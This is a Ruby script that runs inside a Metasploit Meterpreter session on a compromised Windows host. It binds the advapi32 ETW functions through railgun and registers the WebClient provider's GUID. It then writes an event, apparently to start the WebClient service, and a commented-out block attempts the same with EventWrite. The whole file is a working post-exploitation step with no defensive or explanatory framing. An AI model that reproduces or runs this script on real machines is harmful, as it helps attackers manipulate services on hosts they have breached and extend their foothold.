# Works on 64bit win10 with 64bit meter. 
# Crashes on 32bit meter with EventWrite, 
# have not tested with 7, 8, 8.1

# Add the EventRegister function
# https://msdn.microsoft.com/en-us/library/windows/desktop/aa363744%28v=vs.85%29.aspx
client.railgun.add_function('advapi32', 'EventRegister', 'DWORD', [
	['PBLOB', 'ProviderId', 'in'],
	['LPVOID', 'EnableCallback', 'inout'],
	['LPVOID', 'CallbackContext', 'inout'],
	['PDWORD', 'RegHandle', 'out'],
	])

# Add the EventWriteString function, could also be EventWrite
# https://msdn.microsoft.com/is-is/library/windows/desktop/aa363750%28v=vs.85%29.aspx
client.railgun.add_function('advapi32', 'EventWriteString', 'DWORD',[
	['HANDLE', 'RegHandle', 'in'],
	['DWORD', 'Level', 'in'],
	['DWORD', 'Keyword', 'in'],
	['PCHAR', 'String', 'in'],
	])

# https://msdn.microsoft.com/en-us/library/windows/desktop/aa363749%28v=vs.85%29.aspx
client.railgun.add_function('advapi32', 'EventUnregister', 'DWORD',[
	['HANDLE', 'RegHandle', 'in'],
	])

# The way to format our guid correctly!
def string_to_guid(guid)
    aguid = guid.gsub(/\-/,"")
    sguid = aguid[6,2] + aguid[4,2] + aguid[2,2] + aguid[0,2]
    sguid << aguid[10,2] +  aguid[8,2] + aguid[14,2] + aguid[12,2] + aguid[16,4]
    sguid << aguid[20,12]
    sguid = [sguid].pack("H*")
    return sguid
end 


# Windows error reporting guid
# wer = 'e46eead8-0c54-4489-9898-8fa79d059e0e'
# WebClient guid!
webclnt = '22b6d684-fa63-4578-87c9-effcbe6643c7'

# Format the guid and get the reghandle
ggid = string_to_guid(webclnt)
# Register the event and get back the handle
evnt = client.railgun.advapi32.EventRegister(ggid,nil,nil,4)

# Use the handle to write our eventstring, it must be null terminated atleast it says so lol!
client.railgun.advapi32.EventWriteString(evnt['RegHandle'], nil, nil, '\0')

# Unregister the event
client.railgun.advapi32.EventUnregister(evnt['RegHandle'])

#############################################################################################
#############################################################################################
=begin
## https://msdn.microsoft.com/en-us/library/system.diagnostics.eventing.eventdescriptor%28v=vs.110%29.aspx
# new EventDescriptor(0x1, 0x0, 0x10, 0x4, 0x0, 0x0, (long)0x8000000000000005)
# This is whats in our example EventDescCreate(&desc, 1, 0, 0, 4, 0, 0, 0)


# Add the function EventWrite
client.railgun.add_function('advapi32', 'EventWrite', 'DWORD', [
	['HANDLE', 'RegHandle', 'in'],
	['PBLOB', 'EventDescriptor', 'in'],
	['DWORD', 'UserDataCount', 'in'],
	['DWORD', 'UserData', 'inout'],
	])

client.railgun.advapi32.EventWrite(evnt['RegHandle'], ['101040080000000000000005'].pack('H*'), 0, nil)
=end
